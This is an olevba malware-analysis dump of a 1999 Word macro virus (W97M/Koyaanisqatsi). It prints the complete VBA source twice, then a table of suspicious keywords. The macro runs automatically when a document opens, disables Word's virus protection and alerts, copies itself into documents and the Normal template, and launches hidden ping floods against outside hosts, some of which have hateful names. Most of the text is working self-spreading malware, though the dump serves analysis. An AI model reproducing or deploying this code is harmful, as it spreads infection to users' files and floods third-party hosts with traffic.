olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ping
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ping - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
SAVIT = ActiveDocument.Saved
Set ACT = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set TIS = ThisDocument.VBProject.VBComponents(1).CodeModule
Set NRM = NormalTemplate.VBProject.VBComponents(1).CodeModule
If ACT.CountOfLines < TIS.CountOfLines Then
ACT.AddFromString TIS.Lines(1, TIS.CountOfLines)
ActiveDocument.Save
ElseIf NRM.CountOfLines < TIS.CountOfLines Then
NRM.AddFromString TIS.Lines(1, TIS.CountOfLines)
End If
Shell " ping -l 5000 -t innocentangels.com", vbHide
Shell " ping -l 5000 -t whitesonly.net", vbHide
Shell " ping -l 5000 -t kkk.com", vbHide
Shell " ping -l 5000 -t daddysgirl.com", vbHide
ActiveDocument.Saved = SAVIT
'W97M/Koyaanisqatsi (c) Opic [CodeBreakers 1999]
'World out of Balance.
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.bas 
in file: Virus.MSWord.Ping - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
SAVIT = ActiveDocument.Saved
Set ACT = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set TIS = ThisDocument.VBProject.VBComponents(1).CodeModule
Set NRM = NormalTemplate.VBProject.VBComponents(1).CodeModule
If ACT.CountOfLines < TIS.CountOfLines Then
ACT.AddFromString TIS.Lines(1, TIS.CountOfLines)
ActiveDocument.Save
ElseIf NRM.CountOfLines < TIS.CountOfLines Then
NRM.AddFromString TIS.Lines(1, TIS.CountOfLines)
End If
Shell " ping -l 5000 -t innocentangels.com", vbHide
Shell " ping -l 5000 -t whitesonly.net", vbHide
Shell " ping -l 5000 -t kkk.com", vbHide
Shell " ping -l 5000 -t daddysgirl.com", vbHide
ActiveDocument.Saved = SAVIT
'W97M/Koyaanisqatsi (c) Opic [CodeBreakers 1999]
'World out of Balance.
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

